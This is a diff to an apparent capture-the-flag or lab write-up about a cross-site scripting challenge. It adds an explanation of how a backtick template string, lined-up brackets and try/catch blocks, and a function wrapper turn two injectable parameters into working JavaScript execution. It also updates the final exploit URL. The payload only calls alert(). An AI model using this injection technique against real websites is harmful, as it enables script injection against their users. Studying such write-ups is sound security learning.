@@ -1,5 +1,20 @@
 At the start we control variables "CONTROLLABLE_ONE" and "CONTROLLABLE_TWO"
 
+An explanation of the payload below:
+
+1) The backtick (`) makes this exploit possible. CONTROLLABLE_TWO variable appears twice, and if you look at where it appears and the way to close the javascript from each variable, it is different.
+So there is no way to exploit this if both variables are used.
+By using "alert(`" in our payload, everything in between "alert(`*********alert(`)" gets counted as a string within "alert" even though it has multiple lines.
+This allows us to make "CONTROLLABLE_TWO" only executed once in the code.
+
+2) A lot of this exploit is programming - lining up all the brackets, exceptions, etc. One thing about lining them up is that even the "if" statement needs to be lined up properly.
+
+3) Even when we finally exploit this, the "return" statement in the normal JavaScript has to be executed.
+Unless the "return" statement is running in the context of a function, it will not work.
+So we wrap part of the payload within a function using "X=function(){", so that the return statement will work.
+
+-----------------------------------
+
 <!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
 <html>
 <script type="text/javascript">
@@ -34,7 +49,7 @@ window.onload = function(){
 
 
 FINAL Working Payload
-<server>/X?x=START%27,%27%27);}catch(e){}}}else{alert('X');}}catch(e){}};X=function(){try{if(true){if(true){if(true){alert(`%2B%27
+<server>/X?CONTROLLABLE_ONE=abcd&CONTROLLABLE_TWO=START%27,%27%27);}catch(e){}}}else{alert('X');}}catch(e){}};X=function(){try{if(true){if(true){if(true){alert(`%2B%27
 
 <!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
 <html>
